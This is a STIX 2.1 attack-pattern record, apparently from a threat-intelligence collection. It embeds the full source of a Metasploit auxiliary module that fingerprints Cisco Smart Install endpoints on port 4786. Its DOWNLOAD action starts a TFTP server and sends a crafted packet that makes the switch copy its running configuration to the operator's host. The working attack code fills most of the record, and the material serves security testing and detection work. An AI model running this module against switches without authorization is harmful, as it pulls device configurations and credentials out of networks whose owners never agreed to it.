{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--066148ef-af23-426d-8ef1-7947509bda29",
    "created": "2024-08-14T16:27:06.418919Z",
    "modified": "2024-08-14T16:27:06.418924Z",
    "name": "Identify Cisco Smart Install endpoints",
    "description": "( This module attempts to connect to the specified Cisco Smart Install port and determines if it speaks the Smart Install Protocol.  Exposure of SMI to untrusted networks can allow complete compromise of the switch. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/misc/cisco_smart_install.rb",
            "external_id": "cisco_smart_install.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.talosintelligence.com/2017/02/cisco-coverage-for-smart-install-client.html"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.cisco.com/security/cisco-psirt-mitigating-and-detecting-potential-abuse-of-cisco-smart-install-feature"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Cisco-Talos/smi_check"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/frostbits-security/SIET"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Cisco\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => 'Identify Cisco Smart Install endpoints',\n        'Description'    => %q(\n          This module attempts to connect to the specified Cisco Smart Install port\n          and determines if it speaks the Smart Install Protocol.  Exposure of SMI\n          to untrusted networks can allow complete compromise of the switch.\n        ),\n        'Author'         => ['Jon Hart <jon_hart[at]rapid7.com>', 'Mumbai'],\n        'References'     =>\n          [\n            ['URL', 'https://blog.talosintelligence.com/2017/02/cisco-coverage-for-smart-install-client.html'],\n            ['URL', 'https://blogs.cisco.com/security/cisco-psirt-mitigating-and-detecting-potential-abuse-of-cisco-smart-install-feature'],\n            ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi'],\n            ['URL', 'https://github.com/Cisco-Talos/smi_check'],\n            ['URL', 'https://github.com/frostbits-security/SIET']\n\n          ],\n        'License'        => MSF_LICENSE,\n        'DefaultAction' => 'SCAN',\n        'Actions' => [\n          ['SCAN', 'Description' => 'Scan for instances communicating via Smart Install Protocol (default)'],\n          ['DOWNLOAD', 'Description' => 'Retrieve configuration via Smart Install Protocol']\n        ],\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(4786),\n        OptAddressLocal.new('LHOST', [ false, \"The IP address of the system running this module\" ]),\n        OptInt.new('SLEEP', [ true, \"Time to wait for config to come back\", 10]),\n        OptString.new('CONFIG', [ true, \"The source config to copy when using DOWNLOAD\", \"system:running-config\" ])\n      ]\n    )\n  end\n\n  # thanks to https://github.com/Cisco-Talos/smi_check/blob/master/smi_check.py#L52-L53\n  SMI_PROBE = \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\".freeze\n  SMI_RE = /^\\x00{3}\\x04\\x00{7}\\x03\\x00{3}\\x08\\x00{3}\\x01\\x00{4}$/\n  def smi?\n    sock.puts(SMI_PROBE)\n    response = sock.get_once(-1)\n    if response\n      if SMI_RE.match(response)\n        print_good(\"Fingerprinted the Cisco Smart Install protocol\")\n        return true\n      else\n        vprint_status(\"No match for '#{response}'\")\n      end\n    else\n      vprint_status(\"No response\")\n    end\n  end\n\n  def start_tftp\n    print_status(\"Starting TFTP Server...\")\n    @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })\n    @tftp.incoming_file_hook = Proc.new{|info| process_incoming(info) }\n    @tftp.start\n    add_socket(@tftp.sock)\n    @main_thread = ::Thread.current\n  end\n\n  def cleanup\n    # Cleanup is called once for every single thread\n    if ::Thread.current == @main_thread\n      # Wait 5 seconds for background transfers to complete\n      print_status(\"Providing some time for transfers to complete...\")\n      sleep(5)\n\n      if @tftp\n        print_status(\"Shutting down the TFTP service...\")\n        @tftp.close rescue nil\n        @tftp = nil\n      end\n    end\n  end\n\n  #\n  # Callback for incoming files\n  #\n  def process_incoming(info)\n    return if not info[:file]\n    name = info[:file][:name]\n    data = info[:file][:data]\n    from = info[:from]\n    return if not (name && data && from)\n\n    # Trim off IPv6 mapped IPv4 if necessary\n    from = from[0].dup\n    from.gsub!('::ffff:', '')\n\n    print_status(\"Incoming file from #{from} - #{name} (#{data.length} bytes)\")\n    cisco_ios_config_eater(from, rport, data)\n  end\n\n  def decode_hex(string)\n    string.scan(/../).map { |x| x.hex }.pack('c*')\n  end\n\n  def request_config(tftp_server, config)\n    copy_config = \"copy #{config} tftp://#{tftp_server}/#{Rex::Text.rand_text_alpha(8)}\"\n    packet_header = '00000001000000010000000800000408000100140000000100000000fc99473786600000000303f4'\n    packet = (decode_hex(packet_header) + copy_config + decode_hex(('00' * (336 - copy_config.length)))) + (decode_hex(('00' * (336)))) + (decode_hex(('00' * 336)))\n    print_status(\"Attempting #{copy_config}\")\n    sock.put(packet)\n  end\n\n  def run_host(ip)\n    begin\n      case\n        when action.name == 'SCAN'\n          connect\n          return unless smi?\n        when action.name == 'DOWNLOAD'\n          start_tftp\n          connect\n          return unless smi?\n          disconnect # cant send any additional packets, so closing\n          connect\n          tftp_server = datastore['LHOST'] || Rex::Socket.source_address(ip)\n          request_config(tftp_server, datastore['CONFIG'])\n          print_status(\"Waiting #{datastore['SLEEP']} seconds for configuration\")\n          Rex.sleep(datastore['SLEEP'])\n      end\n    rescue Rex::AddressInUse, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, \\\n           ::Errno::ETIMEDOUT, ::Timeout::Error, ::EOFError => e\n      vprint_error(\"error while connecting and negotiating Cisco Smart Install: #{e}\")\n      return\n    ensure\n      disconnect\n    end\n\n    service = report_service(\n      host: rhost,\n      port: rport,\n      proto: 'tcp',\n      name: 'Smart Install'\n    )\n\n    report_vuln(\n      host: rhost,\n      service: service,\n      name: name,\n      info: \"Fingerprinted the Cisco Smart Install Protocol\",\n      refs: references,\n      exploited_at: Time.now.utc\n    )\n  end\nend\n"
}